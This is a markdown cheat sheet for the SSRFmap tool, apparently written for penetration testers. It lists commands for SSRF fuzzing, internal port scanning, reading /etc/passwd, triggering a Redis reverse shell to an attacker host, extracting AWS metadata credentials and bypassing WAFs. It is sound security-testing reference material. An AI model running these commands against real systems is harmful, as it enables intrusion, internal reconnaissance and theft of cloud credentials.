---
icon: people-pulling
---

# SSRFmap

## The SSRFmap Masterclass: Professional SSRF Detection & Exploitation

SSRFmap is a powerful, modular framework for automating the detection and exploitation of Server-Side Request Forgery (SSRF) vulnerabilities. It supports a wide range of exploitation modules, advanced payloads, and integration with Burp Suite, making it essential for professional web application penetration testers.

***

### I. Environment Setup: Dynamic Variables

Export variables for flexible, repeatable workflows and organized output:

```bash
export REQUEST_FILE="burp_request.txt"   # Burp Suite request file
export PARAM="url"                       # Parameter to fuzz
export MODULE="portscan"                 # SSRFmap module (see below)
export OUTPUT_DIR="ssrfmap-results"
export COOKIE="SESSION=abcd1234; other=xyz"
export USER_AGENT="Mozilla/5.0 (SSRFmap)"
export PROXY="<http://127.0.0.1:8080>"
export LHOST="10.10.14.5"                # For reverse shell modules
export LPORT=4444                         # For reverse shell modules
export LEVEL=3                            # Payload encoding/bypass level

```

***

### II. Core Capabilities & Workflow

* **Automated SSRF Fuzzing:** Finds and exploits SSRF injection points in GET, POST, and header parameters.
* **Modular Exploitation:** Supports modules for port scanning, network scanning, file read, RCE (FastCGI, Redis, MySQL, etc.), cloud metadata access, and more.\[3]\[4]\[5]
* **Burp Suite Integration:** Uses Burp request files for real-world, authenticated, and complex requests.
* **Advanced Payloads & Bypass:** Encodes payloads and uses multiple techniques to bypass filters and WAFs.
* **Reverse Shells & Connect-Back:** Supports modules for triggering reverse shells and listening for callbacks.
* **Custom Headers & SSL:** Customizes User-Agent, cookies, and supports HTTPS endpoints.

***

### III. Professional Usage Examples

#### 1. Basic SSRF Fuzzing (GET/POST/Header)

```bash
python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m "$MODULE"

```

#### 2. Use Proxy (e.g., Burp Suite)

```bash
python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m "$MODULE" --proxy "$PROXY"

```

#### 3. Custom User-Agent and Cookies

```bash
python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m "$MODULE" --uagent "$USER_AGENT" --cookie "$COOKIE"

```

#### 4. Enable SSL for HTTPS Endpoints

```bash
python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m "$MODULE" --ssl

```

#### 5. Increase Payload Encoding/Bypass Level

```bash
python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m "$MODULE" --level $LEVEL

```

#### 6. Trigger Reverse Shell (e.g., Redis RCE)

```bash
python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m redis --lhost $LHOST --lport $LPORT -l $LPORT

```

#### 7. Read Internal Files (e.g., /etc/passwd)

```bash
python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m readfiles --rfiles /etc/passwd

```

#### 8. Portscan Internal Network

```bash
python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m portscan

```

#### 9. Network Ping Sweep

```bash
python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m networkscan

```

#### 10. Cloud Metadata Access (AWS, GCP, etc.)

```bash
python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m aws

```

***

### IV. Advanced Techniques & Scenarios

* **Header Injection:** Fuzz custom headers (e.g., `X-Forwarded-For`, `Host`) by specifying the parameter name.
* **WAF/Filter Bypass:** Use `-level` to encode payloads and try alternate IP formats (e.g., `127.0.0.1`, `[::1]`, `0x7f000001`).
* **Reverse Shells:** Use modules like `redis`, `fastcgi`, `mysql`, and specify `-lhost`/`-lport` for connect-back payloads.
* **Custom Data Injection:** Use the `custom` module to send arbitrary data to internal services (e.g., netcat listeners).
* **Cloud Metadata Extraction:** Use modules for AWS, GCP, Alibaba, DigitalOcean to access instance metadata and credentials.
* **Batch Scanning:** Script SSRFmap to iterate over multiple request files or parameters for large-scale assessments.

***

### V. Real-World Workflow Example

1.  **Export Variables:**

    ```bash
    export REQUEST_FILE="burp_request.txt"
    export PARAM="url"
    export MODULE="portscan"
    export OUTPUT_DIR="ssrfmap_htb"
    export LHOST="10.10.14.5"
    export LPORT=4444

    ```
2.  **Scan for SSRF and Internal Port Exposure:**

    ```bash
    python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m portscan --output "$OUTPUT_DIR/portscan.txt"

    ```
3.  **Read Sensitive Internal Files:**

    ```bash
    python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m readfiles --rfiles /etc/passwd --output "$OUTPUT_DIR/passwd.txt"

    ```
4.  **Trigger Reverse Shell via Redis:**

    ```bash
    python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m redis --lhost $LHOST --lport $LPORT -l $LPORT --output "$OUTPUT_DIR/redis_shell.txt"

    ```
5.  **Cloud Metadata Extraction:**

    ```bash
    python3 ssrfmap.py -r "$REQUEST_FILE" -p "$PARAM" -m aws --output "$OUTPUT_DIR/aws_metadata.txt"

    ```
6. **Document Findings:**
   * Save all output and exploitation steps for reporting and future reference.

***

### VI. Pro Tips & Best Practices

* **Always use Burp Suite request files** for real-world, authenticated, and complex requests.
* **Start with low-level payloads** and escalate encoding/bypass levels as needed.
* **Test all injection points:** GET, POST, headers, cookies, and custom fields.
* **Leverage modules for deep exploitation:** Portscan, file read, RCE, cloud metadata, and more.
* **Document all findings and save outputs** for reporting and compliance.
* **Scan only with explicit authorization**—never test targets without permission.
* **Combine SSRFmap with manual testing and other tools** (e.g., Burp Suite, custom scripts) for comprehensive SSRF coverage.

***

This professional SSRFmap guide equips you for advanced, modular SSRF detection, exploitation, and reporting in real-world web application security assessments.
